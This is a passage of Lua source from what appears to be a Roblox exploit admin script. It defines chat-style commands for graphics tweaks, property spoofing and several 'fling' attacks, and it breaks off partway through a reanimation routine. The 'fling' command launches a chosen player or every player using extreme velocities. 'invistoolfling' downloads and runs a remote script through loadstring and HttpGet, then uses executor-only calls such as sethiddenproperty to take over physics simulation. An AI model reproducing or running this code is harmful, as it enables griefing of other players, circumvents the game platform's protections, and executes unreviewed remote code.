	local Lighting = game:GetService("Lighting")
	local RunService = game:GetService("RunService")
	Terrain.WaterWaveSize = 0
	Terrain.WaterWaveSpeed = 0
	Terrain.WaterReflectance = 0
	Terrain.WaterTransparency = 0
	Lighting.GlobalShadows = false
	Lighting.FogEnd = 9e9
	settings().Rendering.QualityLevel = 1
	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("MeshPart") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
			v.Material = "Plastic"
			v.Reflectance = 0
		elseif v:IsA("Decal") then
			v.Transparency = 1
		elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
			v.Lifetime = NumberRange.new(0)
		elseif v:IsA("Explosion") then
			v.BlastPressure = 1
			v.BlastRadius = 1
		end
	end
	for i,v in pairs(Lighting:GetDescendants()) do
		if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
			v.Enabled = false
		end
	end
	workspace.DescendantAdded:Connect(function(child)
		coroutine.wrap(function()
			if child:IsA('ForceField') then
				RunService.Heartbeat:Wait()
				child:Destroy()
			elseif child:IsA('Sparkles') then
				RunService.Heartbeat:Wait()
				child:Destroy()
			elseif child:IsA('Smoke') or child:IsA('Fire') then
				RunService.Heartbeat:Wait()
				child:Destroy()

			end
		end)
	end)
	Utils.Notify(Caller, "LowGFX", "Enabled!")
end)

AddCommand("fps", {"frames"}, "shows you your framerate", {}, function()
	local FPS = 1 / CWait(RenderStepped);
	local Counter = Utils.Notify(LocalPlayer, "FPS", round(FPS));
	local Running;
	delay(4.5, function()
		Disconnect(Running);
	end);
	Running = CConnect(Heartbeat, function()
		if (not Counter or not Counter.Message) then
			Disconnect(Running);
		end
		Counter.Message.Text = round(1 / CWait(RenderStepped));
	end);
end)

AddCommand("displaynames", {}, "enables/disables display names (on/off)", {{"on","off"}}, function(Caller, Args, CEnv)
	local Option = Args[1]
	local Players = Services.Players

	local ShowName = function(v)
		if (v.Name ~= v.DisplayName) then
			if (v.Character) then
				v.Character.Humanoid.DisplayName = v.Name
			end
			local Connection = CConnect(v.CharacterAdded, function()
				WaitForChild(v.Character, "Humanoid").DisplayName = v.Name
			end)
			CEnv[v.Name] = {v.DisplayName, Connection}
			AddPlayerConnection(v, Connection);
		end
	end
	if (lower(Option) == "off") then
		for i, v in next, GetPlayers(Players) do
			ShowName(v);
		end
		AddConnection(CConnect(Players.PlayerAdded, ShowName));
		return "Displaynames enabled."
	elseif (lower(Option) == "on") then
		for i, v in next, LoadCommand("displaynames").CmdEnv do
			if (type(v) == 'userdata' and v.Disconnect) then
				Disconnect(v);
			else
				if (i.Character) then
					i.Character.Humanoid.DisplayName = v[1]
				end
				Disconnect(v[2]);
				v = nil
			end
		end
		Utils.Notify(Caller, "Displaynames", "Disabled!")
	end
end)

AddCommand("daytime", {"day"}, "sets the games time to day", {}, function()
	local Lighting = Services.Lighting
	local Time = 14
	SpoofProperty(Lighting, "ClockTime", true);
	Lighting.ClockTime = Time
	Utils.Notify(Caller, "Time", "Day!")
end)

AddCommand("nighttime", {"night"}, "sets the games time to night", {}, function()
	local Lighting = Services.Lighting
	local Time = 0
	SpoofProperty(Lighting, "ClockTime", true);
	Lighting.ClockTime = Time
	Utils.Notify(Caller, "Time", "Night!")
end)

--[[AddCommand("masshatfling", {"mhatfling"}, "rescales your hat and fling", {4}, function()
	local Settings = {
		Values = {
			BodyTypeScale = true;
			BodyProportionScale = true;
			BodyWidthScale = true;
			BodyHeightScale = true;
			BodyDepthScale = true;
			HeadScale = true;
		};
		OriginalSize = true;
		OriginalPosition = false;
	}

	local Players = game:GetService("Players")
	local Player = Players.LocalPlayer
	local RemoveSeats = true
	local Character = Player.Character
	local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
	if RemoveSeats then
		for _,x in next, workspace:GetDescendants() do
			if x:IsA("Seat") then
				x:Destroy()
			end
		end
	end
	local WaitFunc = function(x) x.DescendantAdded:wait() task.wait() end

	if Humanoid.RigType == Enum.HumanoidRigType.R6 then return end


	for _,x in next, Settings.Values do
		if x then
			if Settings.OriginalSize then --Specific Path/Settings
				for _, _os in next, Character:GetDescendants() do
					if _os.Name == "OriginalSize" and _os:IsA("ValueBase") then
						_os:Destroy()
					end
				end
			end
			if Settings.OriginalPosition then
				for _, _op in next, Character:GetDescendants() do
					if _op.Name == "OriginalPosition" and _op:IsA("ValueBase") then
						_op:Destroy()
					end
				end
			end
			if Humanoid:FindFirstChild(tostring(_)) then
				Humanoid:FindFirstChild(tostring(_)):Destroy()
			end
			WaitFunc(Character)
		end
	end


	local character = game.Players.LocalPlayer.Character
	game.Players.LocalPlayer.Character = nil
	game.Players.LocalPlayer.Character = character
	wait(game.Players.RespawnTime + 0.05)
	game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead,false)

	for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
		if v.Name == "Torso" or v.Name == "UpperTorso" then
			v:Destroy()
		end
	end
	character.HumanoidRootPart:Destroy()
	for i,v in pairs(character:GetChildren()) do
		if v:IsA("Accessory") then
			sethiddenproperty(v,"BackendAccoutrementState", 0) 
		end
	end
	for i,v in pairs(character:GetChildren()) do
		if v:IsA("BasePart") and v.Name ~= "Head" then
			v:Destroy() 
		end
	end
	character.Head:remove() 

	game:GetService("RunService").RenderStepped:wait()
	local v = character:FindFirstChild("PirateCaptain_HatAccessory").Handle
	local temp = Instance.new("BodyPosition")
	temp.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
	temp.Parent = v

	game:GetService("RunService").Stepped:wait()
	local temp1 = Instance.new("BodyThrust")
	temp1.Location = Vector3.new(5,0,0)
	temp1.Force = Vector3.new(40000,40000,40000)
	temp1.Parent = v
	local Box = Instance.new("SelectionBox")
	Box.LineThickness = 0.03

	local part = v
	local selectionBox = Box	
	local t = 5;
	function rainbowEffect(itemToBeColored, property)
		coroutine.wrap(function()
			while wait() do
				local hue = tick() % t / t
				local color = Color3.fromHSV(hue,1,1)
				itemToBeColored[property] = color
			end
		end)()
	end
	rainbowEffect(selectionBox, "Color3")

	Box.Parent = v
	Box.Adornee = v
	v.CanCollide = false
	v.Transparency = 0.3
	while wait() do
		temp.Position = game.Players.LocalPlayer:GetMouse().Hit.p + Vector3.new(0,0,0)
		v.CanCollide = false
	end
	Utils.Notify(Caller, "Masshatfling", "Loaded!")	
end)

AddCommand("hatfling", {}, "makes your hat able to fling", {}, function()

	local character = game.Players.LocalPlayer.Character
	game.Players.LocalPlayer.Character = nil
	game.Players.LocalPlayer.Character = character
	wait(game.Players.RespawnTime + 0.05)
	game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead,false)

	for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
		if v.Name == "Torso" or v.Name == "UpperTorso" then
			v:Destroy()
		end
	end
	character.HumanoidRootPart:Destroy()
	for i,v in pairs(character:GetChildren()) do
		if v:IsA("Accessory") then
			sethiddenproperty(v,"BackendAccoutrementState", 0) 
		end
	end
	for i,v in pairs(character:GetChildren()) do
		if v:IsA("BasePart") and v.Name ~= "Head" then
			v:Destroy() 
		end
	end
	character.Head:remove() 

	game:GetService("RunService").RenderStepped:wait()
	local v = character:FindFirstChildOfClass("Accessory").Handle
	local temp = Instance.new("BodyPosition")
	temp.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
	temp.Parent = v

	game:GetService("RunService").Stepped:wait()
	local temp1 = Instance.new("BodyThrust")
	temp1.Location = Vector3.new(5,0,0)
	temp1.Force = Vector3.new(4000,4000,4000)
	temp1.Parent = v
	local Box = Instance.new("SelectionBox")
	Box.LineThickness = 0.03

	local part = v
	local selectionBox = Box	
	local t = 5;
	function rainbowEffect(itemToBeColored, property)
		coroutine.wrap(function()
			while wait() do
				local hue = tick() % t / t
				local color = Color3.fromHSV(hue,1,1)
				itemToBeColored[property] = color
			end
		end)()
	end
	rainbowEffect(selectionBox, "Color3")

	Box.Parent = v
	Box.Adornee = v
	v.CanCollide = false
	v.Transparency = 0.3
	while wait() do
		temp.Position = game.Players.LocalPlayer:GetMouse().Hit.p + Vector3.new(0,0,0)
		v.CanCollide = false
	end
	Utils.Notify(Caller, "Hatfling", "Loaded!")	
end)--]]

AddCommand("fling", {}, "flings a player", {}, function(Caller, Args)
	local TargetPlayer = getplr(Args[1]);
	function flingem(TargetPlayer)
		local Player = game:GetService("Players").LocalPlayer
		local Character = Player.Character
		local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
		local RootPart = Humanoid and Humanoid.RootPart

		local TCharacter = TargetPlayer.Character
		local THumanoid
		local TRootPart
		local THead
		local Accessory
		local Handle

		if TCharacter:FindFirstChildOfClass("Humanoid") then
			THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
		end
		if THumanoid and THumanoid.RootPart then
			TRootPart = THumanoid.RootPart
		end
		if TCharacter:FindFirstChild("Head") then
			THead = TCharacter.Head
		end
		if TCharacter:FindFirstChildOfClass("Accessory") then
			Accessory = TCharacter:FindFirstChildOfClass("Accessory")
		end
		if Accessoy and Accessory:FindFirstChild("Handle") then
			Handle = Accessory.Handle
		end

		if Character and Humanoid and RootPart then
			--workspace.FallenPartsDestroyHeight =
			if RootPart.Velocity.Magnitude < 50 then
				OldPos = RootPart.CFrame
			end                    
			if THead then
				workspace.CurrentCamera.CameraSubject = THead
			elseif not THead and Handle then
				workspace.CurrentCamera.CameraSubject = Handle
			elseif THumanoid and TRootPart then
				workspace.CurrentCamera.CameraSubject = THumanoid
			end
			if not TCharacter:FindFirstChildWhichIsA("BasePart") then
				return
			end

			local FPos = function(BasePart, Pos, Ang)
				RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
				Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
				RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
				RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
			end

			local SFBasePart = function(BasePart)
				local TimeToWait = 2
				local Time = tick()
				local Angle = 0

				repeat
					if RootPart and THumanoid then
						if BasePart.Velocity.Magnitude < 50 then
							Angle = Angle + 100

							FPos(
								BasePart,
								CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25,
								CFrame.Angles(math.rad(Angle), 0, 0)
							)
							task.wait()

							FPos(
								BasePart,
								CFrame.new(0, -1.5, 0) +
									THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25,
								CFrame.Angles(math.rad(Angle), 0, 0)
							)
							task.wait()

							FPos(
								BasePart,
								CFrame.new(2.25, 1.5, -2.25) +
									THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25,
								CFrame.Angles(math.rad(Angle), 0, 0)
							)
							task.wait()

							FPos(
								BasePart,
								CFrame.new(-2.25, -1.5, 2.25) +
									THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25,
								CFrame.Angles(math.rad(Angle), 0, 0)
							)
							task.wait()

							FPos(
								BasePart,
								CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,
								CFrame.Angles(math.rad(Angle), 0, 0)
							)
							task.wait()

							FPos(
								BasePart,
								CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,
								CFrame.Angles(math.rad(Angle), 0, 0)
							)
							task.wait()
						else
							FPos(
								BasePart,
								CFrame.new(0, 1.5, THumanoid.WalkSpeed),
								CFrame.Angles(math.rad(90), 0, 0)
							)
							task.wait()

							FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
							task.wait()

							FPos(
								BasePart,
								CFrame.new(0, 1.5, THumanoid.WalkSpeed),
								CFrame.Angles(math.rad(90), 0, 0)
							)
							task.wait()

							FPos(
								BasePart,
								CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25),
								CFrame.Angles(math.rad(90), 0, 0)
							)
							task.wait()

							FPos(
								BasePart,
								CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25),
								CFrame.Angles(0, 0, 0)
							)
							task.wait()

							FPos(
								BasePart,
								CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25),
								CFrame.Angles(math.rad(90), 0, 0)
							)
							task.wait()

							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(-90), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
							task.wait()
						end
					else
						break
					end
				until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or
					TargetPlayer.Parent ~= Players or
					not TargetPlayer.Character == TCharacter or
					THumanoid.Sit or
					Humanoid.Health <= 0 or
					tick() > Time + TimeToWait
			end

			workspace.FallenPartsDestroyHeight = 0 / 0

			local BV = Instance.new("BodyVelocity")
			BV.Name = "EpixVel"
			BV.Parent = RootPart
			BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
			BV.MaxForce = Vector3.new(1 / 0, 1 / 0, 1 / 0)

			Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

			if TRootPart and THead then
				if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
					SFBasePart(THead)
				else
					SFBasePart(TRootPart)
				end
			elseif TRootPart and not THead then
				SFBasePart(TRootPart)
			elseif not TRootPart and THead then
				SFBasePart(THead)
			elseif not TRootPart and not THead and Accessory and Handle then
				SFBasePart(Handle)
			else
				--return Message("Error Occurred", "Target is missing everything", 5)
			end

			BV:Destroy()
			Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
			workspace.CurrentCamera.CameraSubject = Humanoid

			repeat
				RootPart.CFrame = OldPos * CFrame.new(0, .5, 0)
				Character:SetPrimaryPartCFrame(OldPos * CFrame.new(0, .5, 0))
				Humanoid:ChangeState("GettingUp")
				table.foreach(
					Character:GetChildren(),
					function(_, x)
						if x:IsA("BasePart") then
							x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
						end
					end
				)
				task.wait()
			until (RootPart.Position - OldPos.p).Magnitude < 25
		else
			return format("Unable to fling.")
		end
	end
	if AllBool == true then
		for _, x in next, Players:GetPlayers() do
			flingem(x)
		end
	else
		flingem(TargetPlayer)
	end
end)

--[[AddCommand("toolfling", {"tfling"}, "fling with tool", {}, function()    
	game:GetService("RunService").RenderStepped:wait()
	local character = game.Players.LocalPlayer.Character
	local Char = GetCharacter();
	local Tools = filter(GetChildren(LocalPlayer.Backpack), function(i, Child)
		return IsA(Child, "Tool");
	end);
	for i, v in next, Tools do
		v.Parent = Char
	end
	Tools.CanCollide = false
	game:GetService("Players").LocalPlayer.Character.Animate.toolnone.ToolNoneAnim.AnimationId = 1
	wait(1)
	if game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").RigType == Enum.HumanoidRigType.R6 then
		character["Right Arm"]:Destroy()
	else
		character["RightHand"]:Destroy()
	end
	UnequipTools(GetHumanoid());
	local Char = GetCharacter();
	local Tools = filter(GetChildren(LocalPlayer.Backpack), function(i, Child)
		return IsA(Child, "Tool");
	end);
	for i, v in next, Tools do
		v.Parent = Char
	end
	local v = character:FindFirstChildOfClass("Tool").Handle
	local temp = Instance.new("BodyPosition")
	temp.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
	temp.Parent = v
	local Radius = 5
	local Speed = 1.5
	local random = random(tick() / 2, tick());
	game:GetService("RunService").Stepped:wait()
	local temp1 = Instance.new("BodyThrust")
	temp1.Location = Vector3.new(5,0,0)
	temp1.Force = Vector3.new(0,4000,0)
	temp1.Parent = v
	local Box = Instance.new("SelectionBox")
	Box.LineThickness = 0.01 
	local Mouse = game:GetService("Players").LocalPlayer:GetMouse()

	local part = v
	local selectionBox = Box	
	local t = 5;
	function rainbowEffect(itemToBeColored, property)
		coroutine.wrap(function()
			while wait() do
				local hue = tick() % t / t
				local color = Color3.fromHSV(hue,1,1)
				itemToBeColored[property] = color
			end
		end)()
	end
	rainbowEffect(selectionBox, "Color3")

	Box.Parent = v
	Box.Adornee = v
	v.CanCollide = false
	MouseDown = false
	local RunService = game:GetService("RunService")
	local UserInputService = game:GetService("UserInputService")



	local MouseDown = false

	Mouse.Button1Down:connect(function()
		MouseDown = true
	end)

	Mouse.Button1Up:connect(function()
		MouseDown = false
	end)

	game:GetService("RunService").Heartbeat:Connect(function()		
		if MouseDown then
			temp.Position = Mouse.Hit.p
			v.CanCollide = false
		else
			temp.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(sin(tick() * Speed) * Radius, 0, cos(tick() * Speed) * Radius), game.Players.LocalPlayer.Character.HumanoidRootPart.Position;
			v.CanCollide = false
		end
	end)
	Utils.Notify(Caller, "Toolfling", "Loaded!")	
end)--]]

AddCommand("invistoolfling", {}, "fling with tool and invisibility", {1}, function()    
	loadstring(game:HttpGet("https://raw.githubusercontent.com/rouxhaver/random-sh-t/main/4eye's%20net-libary%20auto%20applier.lua"))()

	UnequipTools(GetHumanoid());
	local Char = GetCharacter();
	local Tools = filter(GetChildren(LocalPlayer.Backpack), function(i, Child)
		return IsA(Child, "Tool");
	end);
	for i, v in next, Tools do
		v.Parent = Char
	end
	
	-- Humanoid Checking Start --

	local Player = game:FindFirstChildOfClass("Players").LocalPlayer
	local Character = Player.Character or Player.CharacterAdded:Wait()

	local hasSentNotification = false

	local function checkConstraints(part)
		if part:IsA("HingeConstraint") or part:IsA("BallSocketConstraint") then
			if not hasSentNotification then
				game.StarterGui:SetCore("SendNotification", {
					Title = "Error";
					Text = "Something is interfering with your Humanoid, fling might not work properly.";
				})
				hasSentNotification = true
			end
		end
	end

	for _, part in ipairs(Character:GetDescendants()) do
		checkConstraints(part)
	end
	Character.DescendantAdded:Connect(checkConstraints)

	-- Humanoid Checking End --
	
	-- Tool Thing Start --

	local Character = game:FindFirstChildOfClass("Players").LocalPlayer.Character

	local Tool = Character:FindFirstChildOfClass("Tool")

	if Tool then

		Tool.CanBeDropped = false

		local Handle = Tool.Handle

		Handle.Transparency = 0.5

		local Box = Instance.new("Highlight")
		Box.Parent = Handle
		Box.Adornee = Handle
		Box.FillTransparency = 0.5
		Box.LineThickness = 0.01 

		local t = 5;
		function rainbowEffect(itemToBeColored, property)
			coroutine.wrap(function()
				while wait() do
					local hue = tick() % t / t
					local color = Color3.fromHSV(hue,1,1)
					itemToBeColored[property] = color
				end
			end)()
		end

		rainbowEffect(Box, "FillColor")
		rainbowEffect(Box, "OutlineColor")

		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
	end

	-- Tool Thing End --

	local plrs=game:FindFirstChildOfClass("Players")
	local rs=game:FindFirstChildOfClass("RunService")
	local ws=game:FindFirstChildOfClass("Workspace")
	local uis=game:FindFirstChildOfClass("UserInputService")
	local gs=game:FindFirstChildOfClass("GuiService")
	local cg=game:FindFirstChildOfClass("CoreGui")

	local lp=plrs.LocalPlayer
	local pg=lp:FindFirstChildOfClass("PlayerGui")
	local mouse=lp:GetMouse()
	local stepped=rs.Stepped
	local heartbeat=rs.Heartbeat
	local renderstepped=rs.RenderStepped

	local osclock=os.clock
	local tspawn=task.spawn
	local twait=task.wait
	local schar=string.char
	local sbyte=string.byte
	local ssub=string.sub
	local sfind=string.find
	local supper=string.upper
	local mrandom=math.random
	local clamp=math.clamp
	local sin=math.sin
	local abs=math.abs
	local rad=math.rad
	local tinsert=table.insert
	local tfind=table.find
	local tunpack=table.unpack

	local i=Instance.new 
	local v2=Vector2.new 
	local v3=Vector3.new
	local c3=Color3.new 
	local cf=CFrame.new
	local angles=CFrame.Angles
	local u2=UDim2.new
	local e=Enum 
	local cs=ColorSequence.new 
	local csk=ColorSequenceKeypoint.new 

	local sine=osclock()
	local deltaTime=0
	local v3_0=v3(0,0,0)
	local v3_101=v3(1,0,1)
	local v3_010=v3(0,1,0)
	local v3_001=v3(0,0,1)
	local cf_0=cf(0,0,0)
	local v3_xz=v3_101*10
	local v3_net=v3_010*25.01

	local function makepcall(f)
		if type(f)=="function" then
			return function(...)
				local a={...}
				local r=nil
				pcall(function()
					r={f(tunpack(a))}
				end)
				return tunpack(r or {})
			end
		end
		return function() end
	end
	local function rs(l) 
		l=l or mrandom(8,15) 
		local s="" 
		for i=1,l do 
			if mrandom(1,2)==1 then 
				s=s..schar(mrandom(65,90)) 
			else 
				s=s..schar(mrandom(97,122)) 
			end 
		end 
		return s 
	end 
	local function gp(p,n,cl)
		if typeof(p)=="Instance" then
			local c=p:GetChildren()
			for i=1,#c do
				local v=c[i]
				if (v.Name==n) and v:IsA(cl) then
					return v
				end
			end
		end
		return nil
	end
	local function loopgp(...)
		while true do
			local r=gp(...)
			if r then
				return r
			end
			twait()
		end
	end
	local function timegp(p,n,c,t)
		t=osclock()+t
		while t>osclock() do
			local r=gp(p,n,c)
			if r then
				return r
			end
			twait()
		end
		return nil
	end
	local function getNetlessVelocity(realVel)
		--if true then return v3_0 end
		--if true then return realPartVelocity end
		--if true then return v3_net end
		if realVel.Magnitude>25.01 then
			realVel=realVel.Unit*25.01
		end
		return realVel*v3_xz+v3_net
	end
	local isClientInstance=makepcall(function(i)
		return ssub(i:GetDebugId(),1,1)=="0"
	end)
	local isServerInstance=function(i)
		return not isClientInstance(i)
	end


	local flingmode=2
	local allowshiftlock=true
	local ctrltp=true
	local discharscripts=true
	local removebparts=false

	local function reanimate()

		local reclaim = false --if you lost control over a part this will move your primary part to the part so you get it back
		local novoid = true --prevents parts from going under workspace.FallenPartsDestroyHeight if you control them
		local antiragdoll = true --removes instances that are usually used for ragdolling form your character
		local addPartsOnRun = false --allows u to add more parts and joints to the simulation after it started
		local discharscripts = discharscripts --disables all localScripts parented to your character before reanimation
		local removebparts = removebparts --removes the parts that you cannot control in your character by making them fall to void
		local R15toR6 = true --adds fake r6 parts and joints for animations if your character is r15
		local walkSpeed = 16 --your walkspeed (can be changed at runtime)
		local jumpPower = 0 --your jump power (can be changed at runtime)
		local allowshiftlock = allowshiftlock --allows the user to use shiftlock (can be changed at runtime)
		local gravity = 196.2 --how fast the characters velocity increases while falling (can be changed at runtime)
		local simrad = 1000 --sets simulation radius to this with sethiddenproperty (nil to disable)
		local loadtime = plrs.RespawnTime --anti respawn delay		
		local defaultflingvel=v3(20000,20000,20000) --this is the velocity used for flinging if its not provided to the fling function
		local ctrlclicktp = ctrltp --makes you teleport where u point ur mouse cursor at when click and hold ctrl down
		local clickfling = flingmode --click fling mode		
		local maxflingtrsp = 1 --max transparency of the fling part (if its above this it will be set to this)

		local c=lp.Character
		if not c then return end
		if not c:IsDescendantOf(ws) then return end
		local c1=c
		c.AncestryChanged:Connect(function()
			if c1 then
				if c1:IsDescendantOf(ws) then
					c=c1
				else
					c=nil
				end
			end
		end)

		local hum=c:FindFirstChildOfClass("Humanoid")
		local rootpart=gp(c,"HumanoidRootPart","BasePart") or gp(c,"Torso","BasePart") or gp(c,"UpperTorso","BasePart") or (hum and hum.RootPart) or timegp(c,"HumanoidRootPart","BasePart",0.5) or c:FindFirstChildWhichIsA("BasePart")
		if not rootpart then return end

		reclaim=reclaim and (c.PrimaryPart or rootpart)
		R15toR6=R15toR6 and hum and (hum.RigType==e.HumanoidRigType.R15)
		local shp=getfenv().sethiddenproperty
		simrad=shp and tonumber(simrad)

		local flingparts={}
		local children=c:GetChildren()
		for i=1,#children do
			local v=children[i]
			if v:IsA("Tool") then
				local des=v:GetDescendants()
				for i=1,#des do
					local v=des[i]
					if v:IsA("BasePart") and isServerInstance(v) then
						tinsert(flingparts,v)
					end
				end
			end
		end
		local cam=nil
		--theres a way to have ws.currentcamera nil on heartbeat and still have the game run normally
		local function refcam()
			cam=ws.CurrentCamera
			while not cam do
				ws:GetPropertyChangedSignal("CurrentCamera"):Wait()
				cam=ws.CurrentCamera
			end
		end
		refcam()
		local camcf=cam.CFrame
		if not c then return end
		lp.Character=nil
		lp.Character=c
		renderstepped:Once(function()
			refcam()
			cam.CFrame=camcf
		end)
		twait(loadtime)
		refcam()
		if not c then return end

		camcf=cam.CFrame
		local enumCamS=e.CameraType.Scriptable
		local camt=cam.CameraType
		local camcon0=nil
		local camcon1=nil
		local function onnewcamera()
			refcam()
			if camcon0 then 
				camcon0:Disconnect()
				camcon0=nil
			end
			if not c then 
				if cam.CameraType==enumCamS then
					cam.CameraType=camt
				end
				return camcon1:Disconnect() 
			end
			camcon0=cam.Changed:Connect(function(p)
				if not c then
					camcon0:Disconnect()
					return camcon1:Disconnect()
				end
				if (p=="CFrame") and (cam.CFrame~=camcf) then
					cam.CFrame=camcf
				elseif (p=="CameraSubject") or (p=="CameraType") then
					local subj=cam.CameraSubject
					if subj and subj:IsA("Humanoid") and (subj.Parent==c) and (cam.CameraType~=enumCamS) then
						cam.CameraType = enumCamS
					end
				end
			end)
			local subj=cam.CameraSubject
			if subj and subj:IsA("Humanoid") and (subj.Parent==c) and (cam.CameraType~=enumCamS) then
				cam.CameraType=enumCamS
			end
			cam.CFrame=camcf
		end
		camcon1=ws:GetPropertyChangedSignal("CurrentCamera"):Connect(onnewcamera)
		onnewcamera()

		local fpdh=ws.FallenPartsDestroyHeight
		novoid=novoid and (fpdh+1)

		local cfr=rootpart.CFrame
		if removebparts then
			removebparts=cfr
			cfr=(cfr-cfr.Position)+v3(mrandom(-10,10)*100000,fpdh+500,mrandom(-10,10)*100000)
		end
		local con=heartbeat:Connect(function()
			if (not rootpart.Anchored) and (rootpart.ReceiveAge==0) then
				local off=v3_010*sin(osclock()*32)
				rootpart.CFrame=cfr+off
				rootpart.Velocity=v3_010*25.1
				rootpart.RotVelocity=off
			end
		end)
		twait(0.5)
		con:Disconnect()

		if not c then
			onnewcamera()
			return 
		end

		if discharscripts then
			local chi=c:GetChildren()
			for i=1,#chi do
				local v=chi[i]
				if v:IsA("LocalScript") then
					v.Disabled=true
				end
			end
		end

		local joints={}
		local cframes={}
		local lastpositions={}
		local function ondes(v)
			if antiragdoll and v:IsA("HingeConstraint") or v:IsA("BallSocketConstraint") then
				v:Destroy()
			elseif addPartsOnRun then
				if v:IsA("JointInstance") then
					tinsert(joints,{
						Name=v.Name,
						C0=v.C0,
						C1=v.C1,
						Part0=v.Part0,
						Part1=v.Part1
					})
					v:Destroy()
				elseif v:IsA("BasePart") then
					if isClientInstance(v) then
						v={CFrame=v.CFrame,Name=v.Name,Anchored=true}
					end
					cframes[v]=v.CFrame
					lastpositions[v]=v.Position
				end
			end
		end
		if addPartsOnRun then
			local des=c:GetDescendants()
			for i=1,#des do
				ondes(des[i])
			end
			c.DescendantAdded:Connect(ondes)
		else
			addPartsOnRun = true
			local des=c:GetDescendants()
			for i=1,#des do
				ondes(des[i])
			end
			addPartsOnRun = false
			c.DescendantAdded:Connect(ondes)
		end

		if removebparts then
			cfr=removebparts
		end
		local pos=cfr.Position
		local shiftlock=false
		local firstperson=false
		local xzvel=v3_0
		local Yvel=0
		local v3_0150=v3_010*1.5
		local camoff=cf(v3_0,camcf.LookVector)
		camoff=camoff-v3_001*(camcf.Position-(pos+v3_0150)).Magnitude

		local refreshjoints=nil
		refreshjoints=function(part,refreshed)
			if not part then return end
			refreshed=refreshed or {}
			tinsert(refreshed,part)
			for i,v in pairs(joints) do
				local part0=v.Part0
				local part1=v.Part1
				if part1 and (part0==part) then
					cframes[part1]=cframes[part]*v.C0*v.C1:Inverse()
					if not tfind(refreshed,part1) then
						refreshjoints(part1,refreshed)
					end
				elseif part0 and (part1==part) then
					cframes[part0]=cframes[part]*v.C1*v.C0:Inverse()
					if not tfind(refreshed,part0) then
						refreshjoints(part0,refreshed)
					end
				end
			end
		end

		if R15toR6 then
			local R6parts={ 
				head={Name="Head",Anchored=true},
				torso={Name="Torso",Anchored=true},
				root={Name="HumanoidRootPart",Anchored=true},
				leftArm={Name="Left Arm",Anchored=true},
				rightArm={Name="Right Arm",Anchored=true},
				leftLeg={Name="Left Leg",Anchored=true},
				rightLeg={Name="Right Leg",Anchored=true}
			}
			for i,v in pairs(R6parts) do
				cframes[v]=cfr
			end
			tinsert(joints,{
				Name="Neck",
				Part0=R6parts.torso,Part1=R6parts.head,
				C0=cf(0,1,0,-1,0,0,0,0,1,0,1,-0),
				C1=cf(0,-0.5,0,-1,0,0,0,0,1,0,1,-0)
			})
			tinsert(joints,{
				Name="RootJoint",
				Part0=R6parts.root,Part1=R6parts.torso,
				C0=cf(0,0,0,-1,0,0,0,0,1,0,1,-0),
				C1=cf(0,0,0,-1,0,0,0,0,1,0,1,-0)
			})
			tinsert(joints,{
				Name="Right Shoulder",
				Part0=R6parts.torso,Part1=R6parts.rightArm,
				C0=cf(1,0.5,0,0,0,1,0,1,-0,-1,0,0),
				C1=cf(-0.5,0.5,0,0,0,1,0,1,-0,-1,0,0)
			})
			tinsert(joints,{
				Name="Left Shoulder",
				Part0=R6parts.torso,Part1=R6parts.leftArm,
				C0=cf(-1,0.5,0,0,0,-1,0,1,0,1,0,0),
				C1=cf(0.5,0.5,0,0,0,-1,0,1,0,1,0,0)
			})
			tinsert(joints,{
				Name="Right Hip",
				Part0=R6parts.torso,Part1=R6parts.rightLeg,
				C0=cf(1,-1,0,0,0,1,0,1,-0,-1,0,0),
				C1=cf(0.5,1,0,0,0,1,0,1,-0,-1,0,0)
			})
			tinsert(joints,{
				Name="Left Hip" ,
				Part0=R6parts.torso,Part1=R6parts.leftLeg,
